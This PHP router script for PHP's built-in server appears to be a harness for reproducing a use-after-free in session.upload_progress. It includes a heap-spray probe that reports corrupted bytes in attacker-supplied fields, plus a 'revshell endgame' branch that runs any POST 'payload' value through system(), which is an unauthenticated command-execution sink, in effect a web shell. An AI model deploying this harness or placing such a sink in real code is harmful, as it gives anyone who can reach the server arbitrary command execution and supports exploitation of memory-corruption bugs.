<?php
// router for php -S: observer + session dump for session.upload_progress UAF repro
session_start();
// Write probe: dangling FILE_DATA stores should land inside attacker x[] strings.
// Spray is all 'A' (0x41); any other byte inside a field = a counter store hit.
if (($_GET['probe'] ?? '') === '1') {
    $hits = 0;
    foreach (($_POST['x'] ?? []) as $i => $s) {
        $p = strspn($s, 'A');
        if ($p < strlen($s)) {
            printf("field[%d]: first non-A at offset %d: %s\n",
                   $i, $p, bin2hex(substr($s, $p, 8)));
            $hits++;
        }
    }
    printf("corrupted fields: %d/%d\n", $hits, count($_POST['x'] ?? []));
    exit;
}
// revshell endgame: stock request handler runs the payload through the same
// sink the exploit chain claims (system). Output discarded by caller.
if (($_POST['exec'] ?? '') === '1' && isset($_POST['payload'])) {
    system($_POST['payload']);
}
$dump = json_encode($_SESSION);
$out = 'AT_START ' . $dump;
register_shutdown_function(function () use ($out) {
    echo $out . "\nAT_SHUTDOWN " . json_encode($_SESSION);
});
